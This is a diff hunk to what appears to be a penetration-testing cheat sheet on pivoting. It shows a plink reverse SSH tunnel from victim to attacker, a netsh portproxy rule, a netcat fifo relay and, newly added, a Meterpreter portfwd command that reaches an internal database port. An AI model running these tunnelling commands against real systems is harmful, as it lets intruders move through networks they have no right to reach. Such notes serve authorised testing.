@@ -28,3 +28,7 @@ Plink: (on victim: ssh to attacker): plink.exe -ssh test@172.16.75.1 -R 8080:loc
 Netsh: 
 On victim: netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.0.0.1
 On attacker: rm -f fifo;mkfifo fifo;nc -v -lk -p 8080 < fifo | nc 192.168.1.38 8080 > fifo
+
+
+Meterpreter
+meterpreter > portfwd add -l 5222 -p 5432 -r 172.22.0.1
